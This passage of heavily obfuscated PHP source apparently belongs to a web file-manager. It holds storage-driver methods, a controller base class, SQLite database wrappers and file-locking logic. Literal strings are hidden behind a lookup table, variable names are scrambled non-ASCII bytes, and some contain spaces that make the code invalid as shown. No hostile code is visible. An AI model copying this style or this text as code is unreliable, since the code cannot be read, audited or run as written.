hashSimple($ªËÎõçÁ) { $ìå…ˆÔ¸ =& $_SERVER[«òÑğ]; $ ¹£°ôÕ = $this->infoWithChildren($ªËÎõçÁ); return $ ¹£°ôÕ[$ìå…ˆÔ¸[170]][$ìå…ˆÔ¸[680]]; } public function hashMd5($§¤ò ö) { $â©—¶ùÎ =& $_SERVER[«òÑğ]; $¥¾Ïô­ = $this->infoWithChildren($§¤ò ö); return $¥¾Ïô­[$â©—¶ùÎ[170]][$â©—¶ùÎ[552]]; } public function exist($µôÔïğµ) { $Ü­ó¦„× =& $_SERVER[«òÑğ]; $ĞÖÍ¡®ã = $this->parse($µôÔïğµ); if (!$ĞÖÍ¡®ã[$Ü­ó¦„×[87]]) { return $this->isFile($µôÔïğµ) || $this->isFolder($µôÔïğµ); } $È¨àğá” = array($Ü­ó¦„×[480] => $ĞÖÍ¡®ã[$Ü­ó¦„×[478]], $Ü­ó¦„×[32] => $ĞÖÍ¡®ã[$Ü­ó¦„×[87]]); $ä©Ïêê’ = $this->model->where($È¨àğá”)->find(); return $ä©Ïêê’ ? !0 : !1; } public function isFile($ğøğõÕÈ) { $æúÀá£æ =& $_SERVER[«òÑğ]; $ÃØ¹¥²² = $this->infoSimple($ğøğõÕÈ); return $ÃØ¹¥²² && $ÃØ¹¥²²[$æúÀá£æ[488]] == $æúÀá£æ[231] ? !0 : !1; } public function isFolder($Çéµ ÅŠ) { $ÚêÒ£Èæ =& $_SERVER[«òÑğ]; $ÔÇçÏÉı = $this->infoSimple($Çéµ ÅŠ); return $ÔÇçÏÉı && $ÔÇçÏÉı[$ÚêÒ£Èæ[488]] == $ÚêÒ£Èæ[91] ? !0 : !1; } public function listPath($ææ¸£Ùñ, $ªî¡îÚş = false) { $‘Í­óæ€ =& $_SERVER[«òÑğ]; if ($ææ¸£Ùñ == $‘Í­óæ€[12]) { return !1; } $ÀÅ¡›  = array($‘Í­óæ€[480] => $ææ¸£Ùñ); if ($ªî¡îÚş) { return $this->model->listSource($ÀÅ¡› , -1); } return $this->model->listSource($ÀÅ¡› ); } public function has($€½§™ÅÙ, $”à´µˆ = false, $’ø£ÙÍ = null) { $ê€™‘èë =& $_SERVER[«òÑğ]; $ŠúŠ€¯¦ = $this->infoWithChildren($€½§™ÅÙ); if ($”à´µˆ) { return array($ê€™‘èë[243] => $ŠúŠ€¯¦[$ê€™‘èë[243]], $ê€™‘èë[242] => $ŠúŠ€¯¦[$ê€™‘èë[242]]); } return $’ø£ÙÍ ? $ŠúŠ€¯¦[$ê€™‘èë[243]] : $ŠúŠ€¯¦[$ê€™‘èë[242]]; } public function listAll($å“âÜë) { $üğäÖ¡ = IO::info($this->pathParse[$_SERVER[«òÑğ][87]]); if (!$üğäÖ¡) { return array(); } return $this->model->listAll($å“âÜë); } public function getContent($û°¿…) { return $this->model->getContent($û°¿…); } public function setContent($å•’´÷…, $ÃºÏœÍß = '') { return $this->model->setContent($å•’´÷…, $ÃºÏœÍß); } public function fileSubstr($‡Ñ™³ØÀ, $ñÔÛïîö, $•¬§•¡) { return $this->model->fileSubstr($‡Ñ™³ØÀ, $ñÔÛïîö, $•¬§•¡); } public function download($Ÿ”Ïùêœ, $Ê·üËÂÙ = '') { $Âùö²Æı = get_path_father($Ê·üËÂÙ); $ÛØÆê– = get_path_this($Ê·üËÂÙ); $’¥ØÄãı = $this->model->fileInfoGet($Ÿ”Ïùêœ); $‡²»ê¸æ = IO::copy($’¥ØÄãı[$_SERVER[«òÑğ][87]], $Âùö²Æı, !1, $ÛØÆê–); return $‡²»ê¸æ; } public function setModifyTime($–œêç¹Ì, $Ù‡ÏÔËì = '') { $…ÚÎ’¸ =& $_SERVER[«òÑğ]; if (!$–œêç¹Ì) { return; } $this->model->where(array($…ÚÎ’¸[494] => $–œêç¹Ì))->save(array($…ÚÎ’¸[88] => $Ù‡ÏÔËì)); } public function upload($è«ÖÎË, $èÜå”„, $ëÔ°¶¸ = false, $æ¦Ù±ëé = REPEAT_REPLACE) { $ç·ï¦ŞÑ =& $_SERVER[«òÑğ]; $Òë¡ï = $this->parse($è«ÖÎË); $Áå½’‡¡ = $this->model->addFile($Òë¡ï[$ç·ï¦ŞÑ[478]], $èÜå”„, $Òë¡ï[$ç·ï¦ŞÑ[87]], $ëÔ°¶¸, $æ¦Ù±ëé); return $this->getPathOuter($Áå½’‡¡); } public function uploadFileByID($ÏÆ®‡ª, $ï«®”Å¿, $“¯ÁáÅ˜) { $Á®¢úÍ =& $_SERVER[«òÑğ]; $êå¥Ë = $this->parse($ÏÆ®‡ª); $çÙÁ€òÛ = $this->model->addFileByFileID($êå¥Ë[$Á®¢úÍ[478]], $ï«®”Å¿, $êå¥Ë[$Á®¢úÍ[87]], $“¯ÁáÅ˜); return $this->getPathOuter($çÙÁ€òÛ); } public function addFileByRemote($µÛí¡ñÑ, $ò–ù¶İÇ, $“Ù»ƒ£˜ = array(), $ô‹ıÙ…è = '', $Ş÷Ğ—ÕÃ) { $ßÃÕï¸Ê =& $_SERVER[«òÑğ]; $Ôä×éÎ½ = $this->parse($µÛí¡ñÑ); $ô‹ıÙ…è = empty($ô‹ıÙ…è) ? $Ôä×éÎ½[$ßÃÕï¸Ê[87]] : $ô‹ıÙ…è; $³•÷ù“ = $this->model->addFileByRemote($Ôä×éÎ½[$ßÃÕï¸Ê[478]], $ò–ù¶İÇ, $ô‹ıÙ…è, $“Ù»ƒ£˜, $Ş÷Ğ—ÕÃ); return $this->getPathOuter($³•÷ù“); } public function uploadLink($®´ÅïœÖ, $¢Â¨˜Å = 0) { $ÙÏâÖÌ =& $_SERVER[«òÑğ]; $øÍªÄÉù = $this->parse($®´ÅïœÖ); $÷éüàÓ = _get($GLOBALS[$ÙÏâÖÌ[7]], $ÙÏâÖÌ[1433]); $²ÇÕù’ = _get($GLOBALS[$ÙÏâÖÌ[7]], $ÙÏâÖÌ[1434]); $®´ÅïœÖ = Model($ÙÏâÖÌ[682])->createFileName($øÍªÄÉù[$ÙÏâÖÌ[87]], $÷éüàÓ, $²ÇÕù’); return IO::uploadLink($®´ÅïœÖ, $¢Â¨˜Å); } public function fileNameAuto($©‘€»º, $²š¶ôòõ, $©“È¼á = REPEAT_REPLACE, $²ïªÑÃ = false) { return $this->model->fileNameAuto($©‘€»º, $²š¶ôòõ, $©“È¼á, $²ïªÑÃ); } public function fileNameExist($µÙ‚§ï, $£®óœğ) { return $this->model->fileNameExist($µÙ‚§ï, $£®óœğ); } protected function _fileOut($®Ù»æü…, $ŸÁä§Å… = false, $¦£™‘»Ñ = false, $ÄŒúÆ = '', $éÀñ¾Éõ = false) { $›‘ßÁ‘Š =& $_SERVER[«òÑğ]; $ÎØ¼„­ü = $this->model->sourceInfo($®Ù»æü…); if ($ÎØ¼„­ü[$›‘ßÁ‘Š[488]] == $›‘ßÁ‘Š[91]) { header($›‘ßÁ‘Š[1435]); die; } $ ¤ğ ·³ = $this->model->fileInfoGet($®Ù»æü…); $ÄŒúÆ = $ ¤ğ ·³[$›‘ßÁ‘Š[552]] ? $ ¤ğ ·³[$›‘ßÁ‘Š[552]] : $ÄŒúÆ; $á‚Ò‘ÈŸ = isset($GLOBALS[$›‘ßÁ‘Š[183]]) && is_array($GLOBALS[$›‘ßÁ‘Š[183]]) ? $GLOBALS[$›‘ßÁ‘Š[183]][$›‘ßÁ‘Š[32]] : $ÎØ¼„­ü[$›‘ßÁ‘Š[32]]; if ($éÀñ¾Éõ) { return IO::fileOutServer($ ¤ğ ·³[$›‘ßÁ‘Š[87]], $ŸÁä§Å…, $á‚Ò‘ÈŸ, $ÄŒúÆ); } IO::fileOut($ ¤ğ ·³[$›‘ßÁ‘Š[87]], $ŸÁä§Å…, $á‚Ò‘ÈŸ, $ÄŒúÆ); } public function fileOut($§ŞÙ—¦Î, $Æ¶Óà“ = false, $–Œ•¼Ó = false, $ûêµÁ›Ô = '') { $this->_fileOut($§ŞÙ—¦Î, $Æ¶Óà“, $–Œ•¼Ó, $ûêµÁ›Ô); } public function fileOutServer($óŒï¯İÎ, $ª©øŸš = false, $ş„®ÜÍô = false, $ôîã„æ = '') { $this->_fileOut($óŒï¯İÎ, $ª©øŸš, $ş„®ÜÍô, $ôîã„æ, !0); } protected function _fileOutImage($ú‹ÉåÙÏ, $€…û¥¸ª = 250) { $Ìøé®—¿ =& $_SERVER[«òÑğ]; $Îğåºåè = $this->model->pathInfo($ú‹ÉåÙÏ); if ($Îğåºåè[$Ìøé®—¿[488]] == $Ìøé®—¿[91]) { show_json($Ìøé®—¿[1436] . $ú‹ÉåÙÏ, !1); } $‚ü§ÎÊÒ = $this->model->fileInfoGet($ú‹ÉåÙÏ); $Îğåºåè[$Ìøé®—¿[184]] = $‚ü§ÎÊÒ[$Ìøé®—¿[87]]; $GLOBALS[$Ìøé®—¿[183]] = $Îğåºåè; IO::fileOutImage($‚ü§ÎÊÒ[$Ìøé®—¿[87]], $€…û¥¸ª); } public function fileOutImage($è—´•Ñ , $éØ†úÈ€ = 250) { $this->_fileOutImage($è—´•Ñ , $éØ†úÈ€); } public function fileOutImageServer($¬Ïğ‡Íß, $úŠ¢©…è = 250) { $this->_fileOutImage($¬Ïğ‡Íß, $úŠ¢©…è); } public function link($ˆÄ­±øİ, $²§ùÙ”ì = '') { $ğÜè£§å = $this->model->fileInfoGet($ˆÄ­±øİ); return IO::link($ğÜè£§å[$_SERVER[«òÑğ][87]], $²§ùÙ”ì); } protected function parse($ßŸ­ıò¯) { $ŞŒÖÆœ· =& $_SERVER[«òÑğ]; if (strstr($ßŸ­ıò¯, $ŞŒÖÆœ·[8]) === !1) { return array($ŞŒÖÆœ·[496] => intval($ßŸ­ıò¯), $ŞŒÖÆœ·[87] => $ŞŒÖÆœ·[12], $ŞŒÖÆœ·[1432] => array()); } $–ê»ôıÉ = explode($ŞŒÖÆœ·[8], trim($ßŸ­ıò¯, $ŞŒÖÆœ·[8])); if (count($–ê»ôıÉ) < 2) { show_tips(clear_html($ßŸ­ıò¯) . $ŞŒÖÆœ·[1437]); } return array($ŞŒÖÆœ·[496] => intval($–ê»ôıÉ[0]), $ŞŒÖÆœ·[87] => $–ê»ôıÉ[1], $ŞŒÖÆœ·[1432] => array_slice($–ê»ôıÉ, 1)); } } goto FèˆéÄ¼¦Á; B”Ö²ªÖï³: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $åİ‚ÌÑˆ =& $_SERVER[«òÑğ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$åİ‚ÌÑˆ[6]] =& $config; $this->values[$åİ‚ÌÑˆ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $åİ‚ÌÑˆ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ñ¯½¢—¬) { if (1 === func_num_args()) { $this->{$ñ¯½¢—¬} = new $ñ¯½¢—¬(); } else { $µ¶ñ»ÑÌ = new ReflectionClass($ñ¯½¢—¬); $è÷Ë°ò‘ = func_get_args(); array_shift($è÷Ë°ò‘); $this->{$ñ¯½¢—¬} = $µ¶ñ»ÑÌ->newInstanceArgs($è÷Ë°ò‘); } return $this->{$ñ¯½¢—¬}; } public function routeBind($Øš×óÒü, $¤ÕÓ¨È¥, $ÈúÕÛ¡ç = 3) { $’¢ÊÍ“ı =& $_SERVER[«òÑğ]; $…ì¤™Œˆ = $this->in[$’¢ÊÍ“ı[9]]; $Øš×óÒü = str_replace($’¢ÊÍ“ı[10], $’¢ÊÍ“ı[11], trim(trim($Øš×óÒü, $’¢ÊÍ“ı[8]), $’¢ÊÍ“ı[12])); if (!$Øš×óÒü || count($…ì¤™Œˆ) <= $ÈúÕÛ¡ç) { return !1; } $ö÷îÕµ¥ = !0; $»™‘àšı = explode($’¢ÊÍ“ı[8], $Øš×óÒü); for ($›ÃÈßÄ½ = 0; $›ÃÈßÄ½ < count($»™‘àšı); $›ÃÈßÄ½++) { if ($»™‘àšı[$›ÃÈßÄ½] != $…ì¤™Œˆ[$ÈúÕÛ¡ç + $›ÃÈßÄ½]) { $ö÷îÕµ¥ = !1; break; } } if (!$ö÷îÕµ¥) { return; } call_user_func_array(array($this, $¤ÕÓ¨È¥), array()); } public function routeArgs($Ç‘•Öá» = 3) { $åÒ×¬“À = $this->in[$_SERVER[«òÑğ][9]]; if (count($åÒ×¬“À) <= $Ç‘•Öá») { return array(); } $°Î³ï¨¨ = array(); for ($Ü“ê±ªÖ = $Ç‘•Öá»; $Ü“ê±ªÖ < count($åÒ×¬“À); $Ü“ê±ªÖ += 2) { $°Î³ï¨¨[$åÒ×¬“À[$Ü“ê±ªÖ]] = $åÒ×¬“À[$Ü“ê±ªÖ + 1]; $this->in[$åÒ×¬“À[$Ü“ê±ªÖ]] = $åÒ×¬“À[$Ü“ê±ªÖ + 1]; } return $°Î³ï¨¨; } protected function assign($ùµ­ª‰œ, $ß©ÈŸÔá) { $this->values[$ùµ­ª‰œ] = $ß©ÈŸÔá; } protected function display($ú¢ŒÈõÊ) { ob_end_clean(); extract($this->values); require $this->tpl . $ú¢ŒÈõÊ; } } class DbSqliteBase extends Db { public function __construct($¦³£×Š = '') { $Ğ€¾™œ‡ =& $_SERVER[«òÑğ]; if (!extension_loaded($Ğ€¾™œ‡[13])) { think_exception(think_lang($Ğ€¾™œ‡[14]) . $Ğ€¾™œ‡[15]); } if (!empty($¦³£×Š)) { if (!isset($¦³£×Š[$Ğ€¾™œ‡[16]])) { $¦³£×Š[$Ğ€¾™œ‡[16]] = 438; } $this->config = $¦³£×Š; if (empty($this->config[$Ğ€¾™œ‡[17]])) { $this->config[$Ğ€¾™œ‡[17]] = array(); } } } public function connect($¢ışÈ× = '', $¾ıæÒÓ = 0) { $ç¾Ç£´Æ =& $_SERVER[«òÑğ]; if (!isset($this->linkID[$¾ıæÒÓ])) { if (empty($¢ışÈ×)) { $¢ışÈ× = $this->config; } $ïŞ÷ú«å = !empty($¢ışÈ×[$ç¾Ç£´Æ[17]][$ç¾Ç£´Æ[18]]) ? $¢ışÈ×[$ç¾Ç£´Æ[17]][$ç¾Ç£´Æ[18]] : $this->pconnect; $ñüãçñÒ = $ïŞ÷ú«å ? $ç¾Ç£´Æ[19] : $ç¾Ç£´Æ[20]; $this->linkID[$¾ıæÒÓ] = $ñüãçñÒ($¢ışÈ×[$ç¾Ç£´Æ[21]], $¢ışÈ×[$ç¾Ç£´Æ[16]]); if (!$this->linkID[$¾ıæÒÓ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¾ıæÒÓ], 30000); if (1 != think_config($ç¾Ç£´Æ[22])) { unset($this->config); } } return $this->linkID[$¾ıæÒÓ]; } public function free() { $this->queryID = null; } public function query($ßŠù˜) { $«úğ®òÇ =& $_SERVER[«òÑğ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ßŠù˜; if ($this->queryID) { $this->free(); } think_action_status($«úğ®òÇ[23], 1); think_status($«úğ®òÇ[24]); $this->queryID = sqlite_query($this->_linkID, $ßŠù˜); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÅÒÅå¢ï = $this->getAll(); return $ÅÒÅå¢ï; } } public function execute($­éÃäêÙ) { $ß®ôĞ—± =& $_SERVER[«òÑğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $­éÃäêÙ; if ($this->queryID) { $this->free(); } think_action_status($ß®ôĞ—±[25], 1); think_status($ß®ôĞ—±[24]); $ò¬Ùîà„ = sqlite_exec($this->_linkID, $­éÃäêÙ); $this->debug(); if (!1 === $ò¬Ùîà„) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[«òÑğ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $™‡£œ¹» = sqlite_query($this->_linkID, $_SERVER[«òÑğ][27]); if (!$™‡£œ¹») { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯µïš›— = sqlite_query($this->_linkID, $_SERVER[«òÑğ][28]); if (!$¯µïš›—) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ò´Æ¡º½ = array(); if ($this->numRows > 0) { for ($¥¸¼ªæÌ = 0; $¥¸¼ªæÌ < $this->numRows; $¥¸¼ªæÌ++) { $Ò´Æ¡º½[$¥¸¼ªæÌ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ò´Æ¡º½; } public function getFields($ã¹²æÚ£) { $¯¾¿·² =& $_SERVER[«òÑğ]; $Ÿ²’ã„È = $this->query($¯¾¿·²[29] . $ã¹²æÚ£ . $¯¾¿·²[30]); $Å…Õìœí = array(); if ($Ÿ²’ã„È) { foreach ($Ÿ²’ã„È as $ï¡òè›ø => $íòâÅ›˜) { $Å…Õìœí[$íòâÅ›˜[$¯¾¿·²[31]]] = array($¯¾¿·²[32] => $íòâÅ›˜[$¯¾¿·²[31]], $¯¾¿·²[33] => $íòâÅ›˜[$¯¾¿·²[34]], $¯¾¿·²[35] => (bool) ($íòâÅ›˜[$¯¾¿·²[36]] === $¯¾¿·²[12]), $¯¾¿·²[37] => $íòâÅ›˜[$¯¾¿·²[38]], $¯¾¿·²[39] => strtolower($íòâÅ›˜[$¯¾¿·²[40]]) == $¯¾¿·²[41], $¯¾¿·²[42] => strtolower($íòâÅ›˜[$¯¾¿·²[43]]) == $¯¾¿·²[44]); } } return $Å…Õìœí; } public function getTables($å’µêó¶ = '') { $ıĞãª¶§ =& $_SERVER[«òÑğ]; $·‰ÒÛì¡ = $this->query($ıĞãª¶§[45] . $ıĞãª¶§[46] . $ıĞãª¶§[47]); $‹èÒ«ä× = array(); foreach ($·‰ÒÛì¡ as $¿Ğõ•Æ‡ => $Ÿ›©Š‹ó) { $‹èÒ«ä×[$¿Ğõ•Æ‡] = current($Ÿ›©Š‹ó); } return $‹èÒ«ä×; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ò¤·ğ¯— =& $_SERVER[«òÑğ]; $¡áú¬·© = sqlite_last_error($this->_linkID); $this->error = $¡áú¬·© . $Ò¤·ğ¯—[4] . sqlite_error_string($¡áú¬·©); if ($Ò¤·ğ¯—[12] != $this->queryStr) { $this->error .= LNG($Ò¤·ğ¯—[48]) . $this->queryStr; } think_trace($this->error, $Ò¤·ğ¯—[12], $Ò¤·ğ¯—[49]); return $this->error; } public function escapeString($ÀÔ½°Å) { return sqlite_escape_string($ÀÔ½°Å); } public function parseLimit($‹ªÂ«‘) { $ûœÔó‰ı =& $_SERVER[«òÑğ]; $ï¦ªŞç’ = $ûœÔó‰ı[12]; if (!empty($‹ªÂ«‘)) { $‹ªÂ«‘ = explode($ûœÔó‰ı[50], $‹ªÂ«‘); if (count($‹ªÂ«‘) > 1) { $ï¦ªŞç’ .= $ûœÔó‰ı[51] . $‹ªÂ«‘[1] . $ûœÔó‰ı[52] . $‹ªÂ«‘[0] . $ûœÔó‰ı[53]; } else { $ï¦ªŞç’ .= $ûœÔó‰ı[51] . $‹ªÂ«‘[0] . $ûœÔó‰ı[53]; } } return $ï¦ªŞç’; } } class DbSqlite3Base extends Db { public function __construct($ŸãÎ¡Á‚ = '') { $ÃéÚè¨ =& $_SERVER[«òÑğ]; if (!class_exists($ÃéÚè¨[54])) { think_exception(think_lang($ÃéÚè¨[14]) . $ÃéÚè¨[55]); } if (!empty($ŸãÎ¡Á‚)) { if (!isset($ŸãÎ¡Á‚[$ÃéÚè¨[16]])) { $ŸãÎ¡Á‚[$ÃéÚè¨[16]] = 438; } $this->config = $ŸãÎ¡Á‚; if (empty($this->config[$ÃéÚè¨[17]])) { $this->config[$ÃéÚè¨[17]] = array(); } } } public function connect($ØÎûºô¬ = '', $úÓ¶‘™² = 0) { $¼à¢ÜÓ¯ =& $_SERVER[«òÑğ]; if (!isset($this->linkID[$úÓ¶‘™²])) { if (empty($ØÎûºô¬)) { $ØÎûºô¬ = $this->config; } $this->linkID[$úÓ¶‘™²] = new SQLite3($ØÎûºô¬[$¼à¢ÜÓ¯[21]]); if (!$this->linkID[$úÓ¶‘™²]) { think_exception($this->linkID[$úÓ¶‘™²]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$úÓ¶‘™²]->busyTimeout(30000); if (1 != think_config($¼à¢ÜÓ¯[22])) { unset($this->config); } } return $this->linkID[$úÓ¶‘™²]; } public function free() { $this->queryID = null; } public function query($‘ÀùùÉÒ) { $‰ˆÎãê =& $_SERVER[«òÑğ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‘ÀùùÉÒ; if ($this->queryID) { $this->free(); } think_action_status($‰ˆÎãê[23], 1); think_status($‰ˆÎãê[24]); $this->queryID = $this->_linkID->query($‘ÀùùÉÒ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $´£æ— = $this->getAll(); $this->numRows = count($´£æ—); return $´£æ—; } } public function execute($ÁŸ“®) { $ˆÁÚöÌ” =& $_SERVER[«òÑğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÁŸ“®; if ($this->queryID) { $this->free(); } think_action_status($ˆÁÚöÌ”[25], 1); think_status($ˆÁÚöÌ”[24]); $²±ÛÒ› = $this->_linkID->exec($ÁŸ“®); $this->debug(); if (!1 === $²±ÛÒ›) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[«òÑğ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¤•²º– = $this->_linkID->query($_SERVER[«òÑğ][27]); if (!$¤•²º–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¦…­Â¥÷ = $this->_linkID->query($_SERVER[«òÑğ][28]); if (!$¦…­Â¥÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ËØãá†¸ = array(); while ($öú§“Ÿ« = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ËØãá†¸[] = $öú§“Ÿ«; } $this->queryID->reset(); return $ËØãá†¸; } public function getFields($÷ï¿­•) { $·²ËÚÈë =& $_SERVER[«òÑğ]; $¥ĞıÎ»á = $this->query($·²ËÚÈë[29] . $÷ï¿­• . $·²ËÚÈë[30]); $ï›ƒŞÌ = array(); if ($¥ĞıÎ»á) { foreach ($¥ĞıÎ»á as $¥ÁÙ¯ => $çëõ¡ı¨) { $ï›ƒŞÌ[$çëõ¡ı¨[$·²ËÚÈë[32]]] = array($·²ËÚÈë[32] => $çëõ¡ı¨[$·²ËÚÈë[32]], $·²ËÚÈë[33] => $çëõ¡ı¨[$·²ËÚÈë[33]], $·²ËÚÈë[35] => (bool) ($çëõ¡ı¨[$·²ËÚÈë[35]] === $·²ËÚÈë[12]), $·²ËÚÈë[37] => $çëõ¡ı¨[$·²ËÚÈë[56]], $·²ËÚÈë[39] => (bool) $çëõ¡ı¨[$·²ËÚÈë[57]], $·²ËÚÈë[42] => (bool) $çëõ¡ı¨[$·²ËÚÈë[57]]); } } return $ï›ƒŞÌ; } public function getTables($Ÿõ¤©½Ô = '') { $ë¬áÊ’ =& $_SERVER[«òÑğ]; $ì¶£‚çÊ = $this->query($ë¬áÊ’[45] . $ë¬áÊ’[46] . $ë¬áÊ’[47]); $–ß½ığ = array(); foreach ($ì¶£‚çÊ as $Îıòù² => $Ü‡…£æ) { $–ß½ığ[$Îıòù²] = current($Ü‡…£æ); } return $–ß½ığ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $˜¡Ê¦ÄÅ =& $_SERVER[«òÑğ]; $this->error = $this->_linkID->lastErrorMsg(); if ($˜¡Ê¦ÄÅ[12] != $this->queryStr) { $this->error .= LNG($˜¡Ê¦ÄÅ[48]) . $this->queryStr; } think_trace($this->error, $˜¡Ê¦ÄÅ[12], $˜¡Ê¦ÄÅ[49]); return $this->error; } public function escapeString($ŸàÚıß) { $ˆØÕ¸äÃ =& $_SERVER[«òÑğ]; if ($this->_linkID) { return $this->_linkID->escapeString($ŸàÚıß); } return str_ireplace($ˆØÕ¸äÃ[58], $ˆØÕ¸äÃ[59], $ŸàÚıß); } public function parseLimit($Ãó©ã³) { $åÂ£Ë„Œ =& $_SERVER[«òÑğ]; $¡‘Âø = $åÂ£Ë„Œ[12]; if (!empty($Ãó©ã³)) { $Ãó©ã³ = explode($åÂ£Ë„Œ[50], $Ãó©ã³); if (count($Ãó©ã³) > 1) { $¡‘Âø .= $åÂ£Ë„Œ[51] . $Ãó©ã³[1] . $åÂ£Ë„Œ[52] . $Ãó©ã³[0] . $åÂ£Ë„Œ[53]; } else { $¡‘Âø .= $åÂ£Ë„Œ[51] . $Ãó©ã³[0] . $åÂ£Ë„Œ[53]; } } return $¡‘Âø; } } goto c¦İÍ²®ƒ; c‰ë£’ğÑ…: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($›í§†šû) { $¦ÏÕÕ¾Ÿ =& $_SERVER[«òÑğ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¦ÏÕÕ¾Ÿ[626], $›í§†šû); $ş®ÒÏ› = 1; $this->_lockEvent($›í§†šû, array($¦ÏÕÕ¾Ÿ[627], $¦ÏÕÕ¾Ÿ[628]), $ş®ÒÏ›); $this->_lockParent($›í§†šû, array($¦ÏÕÕ¾Ÿ[628]), $ş®ÒÏ›); $this->_lockEvent($›í§†šû, array($¦ÏÕÕ¾Ÿ[629], $¦ÏÕÕ¾Ÿ[630]), $ş®ÒÏ›); $this->_lockCheckEnd($¦ÏÕÕ¾Ÿ[626], $›í§†šû); } public function lockCopyEnd($“¢¢êšò) { $¢ÍùÓıœ =& $_SERVER[«òÑğ]; if (!$this->allowLock()) { return; } $©Ÿ’ÉŞŞ = 0; $this->_lockEvent($“¢¢êšò, array($¢ÍùÓıœ[627], $¢ÍùÓıœ[628]), $©Ÿ’ÉŞŞ); $this->_lockParent($“¢¢êšò, array($¢ÍùÓıœ[628]), $©Ÿ’ÉŞŞ); $this->_lockEvent($“¢¢êšò, array($¢ÍùÓıœ[629], $¢ÍùÓıœ[630]), $©Ÿ’ÉŞŞ); } public function lockWriteStart($¸©Ğ´²¡, $Óö¾Å¢ = '') { $§¶½±‡ó =& $_SERVER[«òÑğ]; if (!$this->allowLock()) { return; } $this->_lockCheck($§¶½±‡ó[627], $¸©Ğ´²¡); $Âòüî­ = 1; $this->_lockKey($§¶½±‡ó[631] . $¸©Ğ´²¡ . $§¶½±‡ó[10] . $Óö¾Å¢, $Âòüî­); $this->_lockEvent($¸©Ğ´²¡, array($§¶½±‡ó[626], $§¶½±‡ó[628]), $Âòüî­); $this->_lockParent($¸©Ğ´²¡, array($§¶½±‡ó[626], $§¶½±‡ó[628]), $Âòüî­); $this->_lockCheckEnd($§¶½±‡ó[627], $¸©Ğ´²¡); } public function lockWriteEnd($ÈØŸÂı¦, $ª…ğĞŞ = '') { $Ô‘¿·à­ =& $_SERVER[«òÑğ]; if (!$this->allowLock()) { return; } $½«¡…ãé = 0; $this->_lockKey($Ô‘¿·à­[631] . $ÈØŸÂı¦ . $Ô‘¿·à­[10] . $ª…ğĞŞ, $½«¡…ãé); $this->_lockEvent($ÈØŸÂı¦, array($Ô‘¿·à­[626], $Ô‘¿·à­[628]), $½«¡…ãé); $this->_lockParent($ÈØŸÂı¦, array($Ô‘¿·à­[626], $Ô‘¿·à­[628]), $½«¡…ãé); } public function lockMoveStart($­‚×—§õ) { $‹ñØˆàÔ =& $_SERVER[«òÑğ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‹ñØˆàÔ[628], $­‚×—§õ); $«•ŸÈÈç = 1; $this->_lockKey($‹ñØˆàÔ[632] . $­‚×—§õ, $«•ŸÈÈç); $this->_lockEvent($­‚×—§õ, array($‹ñØˆàÔ[626], $‹ñØˆàÔ[627]), $«•ŸÈÈç); $this->_lockParent($­‚×—§õ, array($‹ñØˆàÔ[626], $‹ñØˆàÔ[628]), $«•ŸÈÈç); $this->_lockEvent($­‚×—§õ, array($‹ñØˆàÔ[633], $‹ñØˆàÔ[629], $‹ñØˆàÔ[630]), $«•ŸÈÈç); $this->_lockCheckEnd($‹ñØˆàÔ[628], $­‚×—§õ); } public function lockMoveEnd($ª¹¢Ğ¯å) { $ÁØÛ¤¶× =& $_SERVER[«òÑğ]; if (!$this->allowLock()) { return; } $¸Ğ¨à— = 0; $this->_lockKey($ÁØÛ¤¶×[632] . $ª¹¢Ğ¯å, $¸Ğ¨à—); $this->_lockEvent($ª¹¢Ğ¯å, array($ÁØÛ¤¶×[626], $ÁØÛ¤¶×[627]), $¸Ğ¨à—); $this->_lockParent($ª¹¢Ğ¯å, array($ÁØÛ¤¶×[626], $ÁØÛ¤¶×[628]), $¸Ğ¨à—); $this->_lockEvent($ª¹¢Ğ¯å, array($ÁØÛ¤¶×[633], $ÁØÛ¤¶×[629], $ÁØÛ¤¶×[630]), $¸Ğ¨à—); } private function _lockCheck($Ïìáıƒ©, $øİ¡® ¸) { $£°ığ³ü =& $_SERVER[«òÑğ]; $§ÉÈæé = $this->sourceInfo($øİ¡® ¸); $ùé¯×ëê = $Ïìáıƒ© . 